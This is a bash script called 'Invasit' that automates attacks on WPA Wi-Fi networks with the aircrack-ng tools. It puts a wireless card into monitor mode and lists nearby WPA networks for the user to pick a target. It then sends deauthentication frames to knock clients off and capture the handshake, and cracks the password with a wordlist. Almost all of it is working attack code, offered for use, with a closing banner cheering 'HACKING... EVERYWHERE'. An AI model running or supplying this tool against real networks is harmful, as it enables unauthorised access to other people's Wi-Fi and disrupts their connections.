#!/bin/bash

# Invasit version 1 || by: valvesss

###################### PRE-CHECKS ############################

if [[ $EUID -ne 0 ]]; then
        echo -e "\e[You don't have admin privilegies, execute the script as root.""\e[0m"""
        exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[The script should be exected inside a X (graphical) session.""\e[0m"""
    exit 1
fi
###################### SHORTCUTS #############################

airodump1='xterm -title FIND_YOUR_TARGET -e airodump-ng --encrypt WPA $nic -w target -o csv'
airodump2='xterm -title $name -e airodump-ng --bssid $bssidtarget -c $channel,$channel -w $name -o csv $nic'
airodump3='xterm -title $name -e airodump-ng -d $bssidtarget -c $channel,$channel -w $name -o cap $nic &'
aireplay1='xterm -title $name -e aireplay-ng -0 20 -a $bssidtarget -c $bssidclient --ignore-negative-one $nic'
st='0.2'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
WHITE='\033[1;37m'
NC='\033[0m'

baseline="$USER@`hostname`:`pwd`#"
userpath="echo -n $baseline"

# Precautions
trap ctrl_c INT
function ctrl_c(){
	END
}

##################### SYSTEM REQUIREMENTS ####################
function systemrequirements {
	clear
	echo -e "	Checking system requirements...\n"
        echo -ne "	aircrack-ng....."
        if ! hash aircrack-ng 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	aireplay-ng....."
        if ! hash aireplay-ng 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	airmon-ng......."
        if ! hash airmon-ng 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	airodump-ng....."
        if ! hash airodump-ng 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	awk............."
        if ! hash awk 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	xterm..........."
        if ! hash xterm 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        if [ "$exit" = "1" ]; then
        exit 1
        fi
	echo -e "\nSystem ready!"
	sleep $st
	INTRO
}

######################### START ##############################

# INTRODUCTION
function INTRO {
clear
echo ""
echo -e "	${YELLOW}I  NN       N  V             V  A         SSSSSSSS  I  TTTTTTTTT"
sleep $st
echo -e "	I  N N      N   V           V  A A        S         I      T"
sleep $st
echo -e "	I  N  N     N    V         V  A   A       S         I      T"
sleep $st
echo -e "	I  N   N    N     V       V  A     A      SSSSSSSS  I      T"
sleep $st
echo -e "	I  N    N   N      V     V  AAAAAAAAA            S  I      T"
sleep $st
echo -e "	I  N     N  N       V   V  A         A           S  I      T"
sleep $st
echo -e "	I  N      N N        V V  A           A          S  I      T"
sleep $st
echo -e "	I  N       NN         V  A             A  SSSSSSSS  I      T${NC}"
sleep $st
echo ""
echo -e "	${BLUE}v1${NC} / ${GREEN}by: valvesss${NC} / ${RED}support: sleepyhollow.lockwood@protonmail.ch${NC}"
MONMODE
}

# 1) Create NIC mon0
function MONMODE {
nic=mon0
iwconfig > nic.txt 2> /dev/null
nicreal=$(cat nic.txt | awk 'NR==1{print $1}')
rm -rf nic.txt
echo 
if `iwconfig 2> /dev/null | awk '{print $1}' | grep -q $nic`; then
	WORDLIST
else
	iw dev $nicreal interface add $nic type monitor 2> /dev/null
	WORDLIST
fi
}

# 2) Search wordlist and verify if don't exist
function WORDLIST {
echo -e "\n# 1) Type the wordlist full path: #" 
$userpath
read path
a=0
while [ $a -eq 0  ]
do
	if [ !  -f $path ]; then
		echo -e "\n# Wordlist not found, try again: #"
		$userpath
		read path
	else
		a=1
	fi
done
GERTAB
}

# 3) Generate table with all WPA networks found
function GERTAB {
echo -e "\n# 2) When you find the target network, press CTRL+C.  #"
eval $airodump1
name=target
COMDAD
}

# 4) Edit airodump output in a human readable way
function COMDAD {
if [ ! -f $name-01.csv ]; then
	echo -e "\n# CSV not found, rescan? [y/n] #"
	read rescan
	if [ $rescan = "y" ] || [ $rescan = "Y" ]; then
		rm -rf $name-01.csv
		eval $airodump1
	fi
fi
echo -e "\n# 3) Select the network you want to attack: #\n"
cat $name-01.csv | cut -d ',' -f 1,4,14,9 | sed '/Station MAC/,$d' | sed '/^\s*$/d' | sed 's/,//g' | tail -n +2 | nl | awk '{print $1,$5,$2,$3,$4}' | column -t | sed '/ESSID/G' > $name.txt
echo "-------------------------------------------"
cat $name.txt
echo "^------------------------------------------"
read num
bssidtarget=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $3}')
channel=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $4}')
networkname=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $2}')
rm -rf $name.txt
mv $name-01.csv $networkname-01.csv
name=$networkname
GERDAD
}

# 5) Gera dados para capturar o BSSID dos clientes
function GERDAD {
echo -e "\n# 4) Wait to list 2 or more client above STATION column and press CTRL+C. #"
eval $airodump2
aux=1
	while [ $aux = 1 ]; do
		echo -e "\n# Try again? [0/1] / Change Network? [c] #"
		read aux
			if [ $aux = 1 ]; then
				rm -rf $name-01.csv
			elif [ $aux = "c" ] || [ $aux = "C" ]; then
				rm -rf $name-02.csv
				eval $airodump1
					COMDAD
			elif [ $aux != 1 ] && [ $aux != 0 ]; then
				echo "Invalid option, try again."
				aux=1
			fi
	done
mac=$name.lst
cat $name-02.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
rm -rf $name-02.csv
SCAN
}

# 6) Scan the specific network
function SCAN {
echo -e "\n# Scanning for $networkname HANDSHAKE #"
eval $airodump3
HANDSHAKE
}

# 7) Start the handshake capture
function HANDSHAKE {
rm -rf $name-01.csv
nr=$(cat $mac | wc -l)
i=1
while [ $i -le $nr ]; do
	bssidclient=$(awk -v var=$i 'NR==var' $mac)
	eval $aireplay1
	let i=i+1
done
AIRCRACK
}

# 8) Decryptograph the password
function AIRCRACK {
sleep 5
a=0
while [ $a -eq 0  ]
do
		if [ ! -f $name-01.cap ]; then
			b=0
			while [ $b -le 3 ]
			do
				echo -e "\n# .cap not found, reescaning. #"
				sleep 5
				SCAN
				let b=b+1
			done
		fi
	if aircrack-ng $name-01.cap | egrep '0 handshake|0 packets|No networks' &> /dev/null; then
		echo -e "\n# Handshake packet not found in .cap file, try again? [y/n] / Continue [c] #"
		read wish
		if [ $wish = "y" ] || [ $wish = "Y" ]; then
			HANDSHAKE
		elif [ $wish = "n" ] || [ $wish = "N" ]; then
			END
			exit;
		elif [ $aux = "c" ] || [ $aux = "C" ]; then
			a=1
		fi
	fi
	a=1
done
rm -rf $mac
kill $(ps aux | grep 'xterm' | awk '{print $2}') &> /dev/null
wpaclean $name-clean.cap $name-01.cap &> /dev/null
aircrack-ng $name-clean.cap -w $path
echo "Press Enter to continue..."
read enter
END
}

# 9) Reinicialize network services and delete the nic created
function END {
iwconfig 2> /dev/null | grep Monitor > monitor.txt &> /dev/null
sleep $st
clear
echo "[+] Deleting network card if created..."
	if cat monitor.txt | awk '{print $1}' &> /dev/null ; then
		iw dev $nic del &> /dev/null
	fi
rm -rf monitor.txt &> /dev/null
sleep $st
echo "[+] Deleting jerk files..."
rm -rf $name-01.csv &> /dev/null
rm -rf $name-01.cap &> /dev/null
sleep $st
echo "[+] Restarting network services..."
service NetworkManager restart
service networking restart
sleep $st
echo "[+] Thanks for using!"
sleep $st
echo ""
echo "############################################################"
echo -e "##	${YELLOW}ENJOY THE HACKING, I N V A S I T EVERYWHERE${NC}	  ##"
echo "############################################################"
exit
}
systemrequirements
